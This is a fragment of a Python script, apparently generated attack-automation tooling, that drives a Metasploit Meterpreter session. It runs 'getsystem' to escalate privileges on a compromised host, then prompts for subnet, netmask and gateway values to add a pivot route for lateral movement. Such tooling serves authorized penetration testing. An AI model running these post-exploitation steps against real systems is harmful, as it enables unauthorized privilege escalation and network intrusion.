...
async def main():
    ...
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: getsystem[/]")
    confirm_action()
    try:
        metasploit_executor.getsystem(user_params["meterpreter_sessionid"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 8 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: action[/]")
    console.print(f"  Description: Routing action (add/delete)")
    default_val = ""
    user_input = console.input(
        f"[bold]➤ Enter value for action [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: action")
    user_params["action"] = user_input

    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 8 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: subnet[/]")
    console.print(f"  Description: Target subnet in CIDR notation")
    default_val = ""
    user_input = console.input(
        f"[bold]➤ Enter value for subnet [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: subnet")
    user_params["subnet"] = user_input

    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 8 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: netmask[/]")
    console.print(f"  Description: Subnet mask")
    default_val = ""
    user_input = console.input(
        f"[bold]➤ Enter value for netmask [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: netmask")
    user_params["netmask"] = user_input

    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 8 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: gateway[/]")
    console.print(f"  Description: Gateway IP address")
    default_val = ""
    user_input = console.input(
        f"[bold]➤ Enter value for gateway [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: gateway")
    user_params["gateway"] = user_input

    user_params["meterpreter_sessionid"] = metasploit_sessionid

    # Meterpreter command execution
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: route[/]")
    confirm_action()
    try:
        metasploit_executor.route(user_params["action"], user_params["subnet"], user_params["netmask"], user_params["gateway"], user_params["meterpreter_sessionid"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise
